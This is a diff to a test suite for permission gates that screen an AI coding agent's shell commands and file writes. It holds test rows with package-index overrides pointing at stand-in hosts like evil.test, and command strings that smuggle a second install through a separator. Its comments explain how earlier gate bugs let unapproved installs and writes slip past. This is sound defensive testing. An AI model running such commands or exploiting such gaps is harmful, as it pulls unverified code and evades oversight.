@@ -315,12 +315,33 @@ for cmd, want in (
         # unquoted spelling on the next row still blocks.
         ('git commit -m "fix; npm install evil"', "allow"),
         ('git commit -m "fix" ; npm install evil', "deny"),
-        # F9: the flag's value is not a package name.
-        ("pip install --index-url https://internal.example.com/simple "
-         "requests", "allow"),
-        ("pip install -i https://pypi.org/simple flask", "allow"),
-        ("npm install --registry https://r.example.com flask", "allow"),
+        # F9: the flag's value is not a package name...
         ("pip install --no-binary :all: requests", "allow"),
+        ("pip install --python-version 3.11 requests", "allow"),
+        # ...but [round-2 review F-1357] an INDEX-OVERRIDE flag is not an
+        # ordinary value flag. These three were `allow` until 2026-07-29,
+        # while the environment-variable spelling of the identical attack
+        # (next row) was denied from the same reason string in the same
+        # file. An index override redirects even an APPROVED package to a
+        # server this gate cannot verify, so consuming its value and then
+        # checking the package name proves nothing. Denied on both
+        # substrates now; a legitimate internal index belongs in the
+        # project's own package-manager config, which is what the refusal
+        # says.
+        ("pip install --index-url https://internal.example.com/simple "
+         "requests", "deny"),
+        ("pip install -i https://pypi.org/simple flask", "deny"),
+        ("npm install --registry https://r.example.com flask", "deny"),
+        ("cargo add --git https://evil.test/repo", "deny"),
+        ("PIP_INDEX_URL=http://evil.test/simple pip install requests",
+         "deny"),
+        # [round-2 review F-1313] `0`, `1` and `2` are all real npm registry
+        # packages; `^[0-9.]+$` could not tell them from a version, so each
+        # installed unapproved after any of ~60 flags. A bare version needs
+        # a DOT now.
+        ("npm install -f 0", "deny"),
+        ("npm install -p 1", "deny"),
+        ("npm i -w 2", "deny"),
         # ...but a short flag must not swallow a package name.
         ("npm install -f evil", "deny"),
         ("npm install -d evil", "deny"),
@@ -492,7 +513,19 @@ differential("test-gate", bash("ls -la"), "allow", "non-commit command")
 print("\n== tdd-gate ==")
 os.makedirs(os.path.join(PROJ, "tests"), exist_ok=True)
 for fp, want in (("docs/readme.md", "allow"),
-                 ("src/brandnew.py", "deny")):
+                 ("src/brandnew.py", "deny"),
+                 ("./src/brandnew.py", "deny"),
+                 # [round-2 review F-1393, FIXED] Claude Code passes
+                 # ABSOLUTE file paths, and the shell gate's `case` was
+                 # anchored on `src/`/`lib/` - so on the payload shape the
+                 # harness actually sends it matched nothing and silently
+                 # allowed every write, while the SDK twin normalized and
+                 # denied. The SDK comment named the bug verbatim and fixed
+                 # only its own side. This corpus used relative paths
+                 # exclusively, so the flagship parity test certified an
+                 # agreement that did not exist in production.
+                 (os.path.join(PROJ, "src", "brandnew.py"), "deny"),
+                 (os.path.join(PROJ, "docs", "readme.md"), "allow")):
     differential("tdd-gate", {"tool_name": "Write",
                               "tool_input": {"file_path": fp}}, want,
                  repr(fp))
@@ -546,53 +579,17 @@ def ledger(gate, payload, now, should, owner, label):
           f"behaviour moved without the row being updated")
 
 
-# -- F-870 and F-891 were here. Both are FIXED (the quoted-run rule is now
-# -- structural: a shell invoker's argument is re-tokenized, everyone else's
-# -- quoted run stays opaque, and quote state carries across newlines).
-# -- Their shapes moved UP into the live corpus as positive assertions
-# -- rather than being deleted, so the fix stays pinned in both directions.
+# The ledger is EMPTY. Every row it held (F-381, F-435, F-788, F-870,
+# F-891, F-947, F-1313, F-1357, F-1393) is fixed, and each one's shapes were
+# promoted into the live corpus above as positive assertions rather than
+# deleted - so the fixes are pinned in both directions and the ledger did
+# not become the place they went to be forgotten.
 #
-# -- finding 788: `pattern` is a search REGEX, not a path, but it sits in the
-# -- phase where a bare directory stem counts as naming the directory. Both
-# -- substrates agree, so only a ledger row can hold it.
-ledger("secrets-gate",
-       {"tool_name": "Grep", "tool_input": {"pattern": "secrets",
-                                            "path": "src"}},
-       ("deny", "deny"), ("allow", "allow"),
-       "F-788 Grep pattern treated as a path",
-       'Grep pattern="secrets" path="src"')
+# It stays here, with the count pinned at zero, because it is the mechanism
+# and not the contents that matters: the next review that finds an open
+# defect adds a row instead of leaving the suite green over it, and a row
+# added without updating the count fails immediately.
 
-# -- finding 947: the dotenv-template exemption `continue`s the TARGET loop,
-# -- not the pattern loop, so it skips EVERY never-read pattern - including
-# -- the `secrets/**` it must never override.
-for _fp in ("secrets/.env.example", "secrets/env.template"):
-    ledger("secrets-gate",
-           {"tool_name": "Read", "tool_input": {"file_path": _fp}},
-           ("allow", "allow"), ("deny", "deny"),
-           "F-947 dotenv exemption escapes its pattern", repr(_fp))
-
-# -- finding 1357: the CLI spelling of a package-index override is silently
-# -- skipped as a flag value, while the same commit blocks the env-var
-# -- spelling of the identical attack (asserted `deny` in the corpus above).
-for _c in ("pip install --index-url http://evil.test/simple requests",
-           "pip install -i http://evil.test/simple requests",
-           "npm install --registry http://evil.test flask",
-           "cargo add --git https://evil.test/repo"):
-    ledger("dependency-gate", bash(_c), ("allow", "allow"), ("deny", "deny"),
-           "F-1357 CLI index override", repr(_c))
-
-# -- finding 1313: `^[0-9.]+$` cannot tell a version from a package name.
-# -- `0`, `1` and `2` are all real npm registry packages.
-for _c in ("npm install -f 0", "npm install -p 1", "npm i -w 2"):
-    ledger("dependency-gate", bash(_c), ("allow", "allow"), ("deny", "deny"),
-           "F-1313 numeric package names", repr(_c))
-
-# -- F-381 and F-435 were here, and they diverged in OPPOSITE directions -
-# -- F-381 shell=deny/sdk=allow, F-435 shell=allow/sdk=deny - so neither
-# -- could be fixed by moving one substrate toward the other. Both are FIXED
-# -- (the SDK verb anchor is re-synced to the shell's and shares one prefix
-# -- alternation with the install anchor; the shell segmenter is now
-# -- quote-aware). Their shapes moved into the live corpus below.
 stage_only(["src/unreferenced.py"])
 differential("spec-gate-commit", bash("git commit -m x"), "deny",
              "unreferenced file, plain verb (the control)")
@@ -624,22 +621,11 @@ for _c, _want in (('echo "git commit"', "allow"),
                   ('git commit -m "not; a separator"', "deny")):
     differential("spec-gate-commit", bash(_c), _want, repr(_c))
 
-# -- finding 1393: Claude Code passes ABSOLUTE file paths. The SDK
-# -- normalizes and denies; the shell's `case` never matches, so the gate is
-# -- a silent no-op in production. The tdd corpus above uses only relative
-# -- paths, so it certifies an agreement that does not exist.
-ledger("tdd-gate",
-       {"tool_name": "Write",
-        "tool_input": {"file_path": os.path.join(PROJ, "src", "brandnew.py")}},
-       ("allow", "deny"), ("deny", "deny"),
-       "F-1393 shell tdd-gate dead on absolute paths",
-       "absolute src/brandnew.py")
-
 # The count is pinned so a row cannot be DELETED to silence it. Deleting a
 # row without fixing the defect trips this; fixing a defect trips the row
 # itself first ("delete this row"), then this. Both steps are deliberate.
-check(f"known-defect ledger holds exactly 11 open rows (got {LEDGER_OPEN})",
-      LEDGER_OPEN == 11,
+check(f"known-defect ledger holds exactly 0 open rows (got {LEDGER_OPEN})",
+      LEDGER_OPEN == 0,
       "a row was added or removed without updating this count")
 
 # --------------------------------------------------------------------------- #
